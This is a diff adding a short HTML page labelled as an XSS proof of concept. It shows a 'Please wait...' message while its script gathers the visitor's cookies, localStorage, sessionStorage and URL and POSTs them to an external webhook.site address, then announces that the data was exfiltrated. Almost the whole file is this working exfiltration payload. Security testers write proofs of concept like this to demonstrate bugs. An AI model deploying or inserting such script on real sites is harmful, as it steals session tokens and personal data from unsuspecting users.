@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>PoC Login Page</title>
+  </head>
+  <body>
+    <h1>Please wait...</h1>
+
+    <script>
+      let data = `
+🍪 Cookies:
+${document.cookie}
+
+📦 LocalStorage:
+${JSON.stringify(localStorage, null, 2)}
+
+📦 SessionStorage:
+${JSON.stringify(sessionStorage, null, 2)}
+
+🌍 URL:
+${location.href}
+      `;
+
+      fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: data
+      });
+
+      alert("XSS triggered via /login and data exfiltrated!");
+    </script>
+  </body>
+</html>
